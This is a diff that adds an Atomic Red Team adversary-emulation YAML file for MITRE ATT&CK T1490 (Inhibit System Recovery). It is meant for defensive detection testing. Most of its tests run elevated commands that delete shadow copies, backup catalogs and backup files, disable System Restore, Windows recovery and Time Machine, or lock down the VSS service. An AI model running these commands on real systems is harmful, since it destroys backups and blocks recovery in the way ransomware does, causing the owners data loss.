@@ -1,0 +1,211 @@
+attack_technique: T1490
+display_name: Inhibit System Recovery
+atomic_tests:
+- name: Windows - Delete Volume Shadow Copies
+  auto_generated_guid: 43819286-91a9-4369-90ed-d31fb4da2c01
+  description: |
+    Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
+    execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it
+    will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
+    confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.
+
+    https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+    prereq_command: |
+      if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      vssadmin.exe create shadow /for=c:
+  executor:
+    command: |
+      vssadmin.exe delete shadows /all /quiet
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Delete Volume Shadow Copies via WMI
+  auto_generated_guid: 6a3ff8dd-f49c-4272-a658-11c2fe58bd88
+  description: |
+    Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      WMIC must be installed (deprecated and removed by default in Windows 11 22H2+)
+    prereq_command: |
+      if (Get-Command wmic.exe -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+  - description: |
+      Create volume shadow copy of C:\ .
+    prereq_command: |
+      if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      wmic shadowcopy call create Volume='C:\'
+  executor:
+    command: |
+      wmic.exe shadowcopy delete
+    name: command_prompt
+    elevation_required: true
+- name: Windows - wbadmin Delete Windows Backup Catalog
+  auto_generated_guid: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c
+  description: |
+    Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
+    "The backup catalog has been successfully deleted." will be displayed in the PowerShell session.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wbadmin delete catalog -quiet
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Disable Windows Recovery Console Repair
+  auto_generated_guid: cf21060a-80b3-4238-a595-22525de4ab81
+  description: |
+    Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+    Upon execution, "The operation completed successfully." will be displayed in the powershell session.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+      bcdedit.exe /set {default} recoveryenabled no
+    cleanup_command: |
+      bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
+      bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
+  auto_generated_guid: 39a295ca-7059-4a88-86f6-09556c1211e7
+  description: |
+    Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
+    This technique is used by numerous ransomware families such as Sodinokibi/REvil.
+    Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
+    there may be no output displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+    name: powershell
+    elevation_required: true
+- name: Windows - Delete Backup Files
+  auto_generated_guid: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
+  description: |
+    Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
+    to delete files from around the system.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+    name: command_prompt
+    elevation_required: true
+- name: Windows - wbadmin Delete systemstatebackup
+  auto_generated_guid: 584331dd-75bc-4c02-9e0b-17f5fd81c748
+  description: |
+    Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wbadmin delete systemstatebackup -keepVersions:0
+    name: command_prompt
+    elevation_required: true
+- name: Windows - Disable the SR scheduled task
+  auto_generated_guid: 1c68c68d-83a4-4981-974e-8993055fa034
+  description: |
+    Use schtasks.exe to disable the System Restore (SR) scheduled task
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
+    cleanup_command: |
+      schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Disable System Restore Through Registry
+  auto_generated_guid: 66e647d1-8741-4e43-b7c1-334760c2047f
+  description: |
+    Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. 
+    See how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
+      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
+    cleanup_command: |
+      reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
+      reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Windows - vssadmin Resize Shadowstorage Volume
+  auto_generated_guid: da558b07-69ae-41b9-b9d4-4d98154a7049
+  description: 
+    Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.
+  supported_platforms:
+  - windows
+  executor:
+    command: 'vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'
+    name: powershell
+    elevation_required: true
+
+- name: "Modify VSS Service Permissions"
+  auto_generated_guid: a4420f93-5386-4290-b780-f4f66abc7070
+  description: |
+    This atomic test alters the security settings of the Volume Shadow Copy Service (VSS) by modifying its permissions, potentially impacting system recovery operations. The specific permissions set by the command are as follows:
+    - Deny Generic All (GA) permissions to Network Users (NU)
+    - Deny GA permissions to Everyone (WD)
+    - Deny GA permissions to Anonymous (AN)
+    - Allow Full Access (FA) and Generic All (GA) permissions to Everyone (WD) in System ACL (SACL)
+    - Allow Object Inherit and Inherit Only (OIIO) Full Access (FA) and GA permissions to Everyone (WD) in SACL
+    These permissions can significantly restrict VSS functionalities, including backup and restore operations. As such, it is essential to run this test only in a controlled environment with administrative privileges.
+    A cleanup command is provided to reset VSS permissions to a common default configuration, which should be verified against your specific system's configuration. It's crucial to use this cleanup command after testing to ensure the system's backup and recovery capabilities remain functional. Running this test on a production system or critical environment is not recommended without proper precautions and a robust recovery plan.
+  supported_platforms:
+  - windows
+  executor:
+    name: "command_prompt"
+    elevation_required: true
+    command: |
+      sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
+    cleanup_command: |
+      sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
+- name: Disable Time Machine 
+  auto_generated_guid: ed952f70-91d4-445a-b7ff-30966bfb1aff
+  description: |
+     Disables Time Machine which is Apple's automated backup utility software. Attackers can use this to prevent backups from occurring and hinder the victim's ability to recover from any damage.
+  supported_platforms:
+  - macos
+  executor:
+    command: sudo tmutil disable
+    cleanup_command: sudo tmutil enable
+    name: sh
+    elevation_required: true
+- name: Windows - Delete Volume Shadow Copies via Diskshadow
+  auto_generated_guid: 42111a6f-7e7f-482c-9b1b-3cfd090b999c
+  description: |
+    Deletes Windows Volume Shadow Copies via Diskshadow binary. This technique is used by numerous ransomware families such as Crytox. The binary is present by default in Windows Server operating systems (since Windows Server 2008). Upon execution, it will delete all shadow copies of the server.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+    prereq_command: |
+      if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      vssadmin.exe create shadow /for=c:
+  executor:
+    command: |
+      "delete shadows all" | diskshadow.exe
+    name: powershell
+    elevation_required: true
